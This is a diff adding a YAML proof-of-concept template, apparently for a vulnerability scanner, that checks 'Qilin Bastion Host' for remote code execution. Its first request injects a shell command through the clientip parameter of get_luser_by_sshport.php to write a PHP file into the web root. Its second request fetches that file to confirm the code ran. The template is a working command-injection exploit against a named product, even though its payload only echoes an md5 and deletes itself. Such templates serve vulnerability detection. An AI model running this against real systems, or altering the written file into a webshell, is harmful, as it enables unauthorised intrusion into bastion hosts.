@@ -1,0 +1,31 @@
+id: poc-yaml-qilin-bastion-host-rce
+info:
+  name: Qilin Bastion Host 远程代码执行漏洞
+  severity: medium
+  tags:
+  - rce
+  finger: Qilin Bastion Host
+  reference: []
+  description: null
+variables:
+  r2: random_str(10)
+transport: http
+requests:
+- method: GET
+  path: /get_luser_by_sshport.php?clientip=1;echo%20"<?php%20echo%20md5({{.r2}});unlink(__FILE__);?>">/opt/freesvr/web/htdocs/freesvr/audit/{{.r2}}.php;&clientport=1
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200
+  output: []
+- method: GET
+  path: /{{.r2}}.php
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, md5(r2))
+  output: []
